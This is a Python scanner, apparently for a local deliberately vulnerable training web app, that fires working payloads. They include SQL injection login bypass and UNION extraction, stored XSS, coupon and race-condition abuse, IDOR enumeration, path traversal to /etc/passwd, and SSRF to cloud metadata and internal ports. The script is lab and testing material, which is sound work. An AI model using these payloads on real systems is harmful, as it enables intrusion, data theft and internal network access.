#!/usr/bin/env python3
"""
Comprehensive Vulnerability Scanner for Vulnerable Lab
Tests all vulnerabilities in sequence
"""

import requests
import json
import time
import concurrent.futures
from urllib.parse import urljoin

class VulnerabilityTester:
    def __init__(self, base_url="http://127.0.0.1:5002"):
        self.base_url = base_url
        self.session = requests.Session()
        self.results = {}
    
    def test_sql_injection(self):
        """Test SQL Injection vulnerability"""
        print("🔍 Testing SQL Injection...")
        
        payloads = [
            "admin' OR '1'='1' --",
            "admin' UNION SELECT username,password,email,role FROM users --"
        ]
        
        for payload in payloads:
            try:
                response = self.session.post(
                    urljoin(self.base_url, "/login"),
                    data={"username": payload, "password": "anything"}
                )
                
                if "dashboard" in response.url or "admin" in response.text.lower():
                    self.results["SQL Injection"] = "✅ VULNERABLE"
                    return True
            except Exception as e:
                continue
        
        self.results["SQL Injection"] = "❌ Not exploitable"
        return False
    
    def test_xss(self):
        """Test XSS vulnerability"""
        print("🔍 Testing XSS...")
        
        # First login
        self.session.post(
            urljoin(self.base_url, "/login"),
            data={"username": "john_doe", "password": "password123"}
        )
        
        payload = "<script>alert('XSS')</script>"
        
        try:
            response = self.session.post(
                urljoin(self.base_url, "/add_comment"),
                data={"product_id": 1, "comment": payload}
            )
            
            # Check if payload appears unescaped
            product_response = self.session.get(urljoin(self.base_url, "/product/1"))
            
            if payload in product_response.text:
                self.results["XSS"] = "✅ VULNERABLE"
                return True
        except Exception as e:
            pass
        
        self.results["XSS"] = "❌ Not exploitable"
        return False
    
    def test_business_logic(self):
        """Test Business Logic Flaw"""
        print("🔍 Testing Business Logic Flaw...")
        
        try:
            # Add item to cart
            self.session.post(
                urljoin(self.base_url, "/add_to_cart"),
                data={"product_id": 1}
            )
            
            # Apply SAVE10 coupon (should give 15% instead of 10%)
            response = self.session.post(
                urljoin(self.base_url, "/apply_coupon"),
                data={"coupon_code": "SAVE10"}
            )
            
            # Check if discount is more than expected
            if "15%" in response.text or "discount applied" in response.text.lower():
                self.results["Business Logic"] = "✅ VULNERABLE - Inflated discounts"
                return True
        except Exception as e:
            pass
        
        self.results["Business Logic"] = "❌ Not exploitable"
        return False
    
    def test_race_condition(self):
        """Test Race Condition vulnerability"""
        print("🔍 Testing Race Condition...")
        
        try:
            # Add item to cart first
            self.session.post(
                urljoin(self.base_url, "/add_to_cart"),
                data={"product_id": 1}
            )
            
            # Concurrent coupon applications
            def apply_coupon():
                return self.session.post(
                    urljoin(self.base_url, "/apply_coupon"),
                    data={"coupon_code": "SAVE10"}
                )
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                futures = [executor.submit(apply_coupon) for _ in range(10)]
                results = [f.result() for f in concurrent.futures.as_completed(futures)]
            
            # Check if multiple applications succeeded
            success_count = sum(1 for r in results if r.status_code == 200)
            
            if success_count > 1:
                self.results["Race Condition"] = f"✅ VULNERABLE - {success_count} concurrent applications"
                return True
        except Exception as e:
            pass
        
        self.results["Race Condition"] = "❌ Not exploitable"
        return False
    
    def test_idor(self):
        """Test IDOR vulnerability"""
        print("🔍 Testing IDOR...")
        
        try:
            # Test profile access
            for user_id in range(1, 5):
                response = self.session.get(
                    urljoin(self.base_url, f"/profile/{user_id}")
                )
                
                if response.status_code == 200 and "profile" in response.text.lower():
                    self.results["IDOR"] = f"✅ VULNERABLE - Access to user {user_id}"
                    return True
        except Exception as e:
            pass
        
        self.results["IDOR"] = "❌ Not exploitable"
        return False
    
    def test_directory_traversal(self):
        """Test Directory Traversal vulnerability"""
        print("🔍 Testing Directory Traversal...")
        
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "../app.py"
        ]
        
        for payload in payloads:
            try:
                response = self.session.get(
                    urljoin(self.base_url, "/file_viewer"),
                    params={"filename": payload}
                )
                
                if "root:" in response.text or "def " in response.text:
                    self.results["Directory Traversal"] = f"✅ VULNERABLE - {payload}"
                    return True
            except Exception as e:
                continue
        
        self.results["Directory Traversal"] = "❌ Not exploitable"
        return False
    
    def test_ssrf(self):
        """Test SSRF vulnerability"""
        print("🔍 Testing SSRF...")
        
        internal_urls = [
            "http://127.0.0.1:22",
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost:3306"
        ]
        
        for url in internal_urls:
            try:
                response = self.session.post(
                    urljoin(self.base_url, "/check_stock_api"),
                    data={"stock_api_url": url}
                )
                
                if response.status_code == 200 and len(response.text) > 50:
                    self.results["SSRF"] = f"✅ VULNERABLE - Internal access to {url}"
                    return True
            except Exception as e:
                continue
        
        self.results["SSRF"] = "❌ Not exploitable"
        return False
    
    def run_all_tests(self):
        """Run all vulnerability tests"""
        print("🚀 Starting Comprehensive Vulnerability Scan")
        print("=" * 60)
        
        # Login first
        login_response = self.session.post(
            urljoin(self.base_url, "/login"),
            data={"username": "john_doe", "password": "password123"}
        )
        
        tests = [
            self.test_sql_injection,
            self.test_xss,
            self.test_business_logic,
            self.test_race_condition,
            self.test_idor,
            self.test_directory_traversal,
            self.test_ssrf
        ]
        
        for test in tests:
            try:
                test()
                time.sleep(1)  # Rate limiting
            except Exception as e:
                print(f"Error in {test.__name__}: {e}")
        
        self.print_results()
    
    def print_results(self):
        """Print scan results"""
        print("\n" + "=" * 60)
        print("🎯 VULNERABILITY SCAN RESULTS")
        print("=" * 60)
        
        for vuln, status in self.results.items():
            print(f"{vuln:<20} {status}")
        
        vulnerable_count = sum(1 for status in self.results.values() if "✅" in status)
        total_tests = len(self.results)
        
        print(f"\n📊 Summary: {vulnerable_count}/{total_tests} vulnerabilities found")
        
        if vulnerable_count > 0:
            print("\n⚠️  CRITICAL: This system has multiple security vulnerabilities!")
            print("🔧 Refer to COMPLETE_EXPLOITATION_GUIDE.md for exploitation details")

def main():
    print("🔥 Vulnerable Lab Comprehensive Scanner")
    print("This tool tests all known vulnerabilities in the lab")
    
    base_url = input("Enter base URL (default: http://127.0.0.1:5002): ").strip()
    if not base_url:
        base_url = "http://127.0.0.1:5002"
    
    tester = VulnerabilityTester(base_url)
    tester.run_all_tests()

if __name__ == "__main__":
    main()
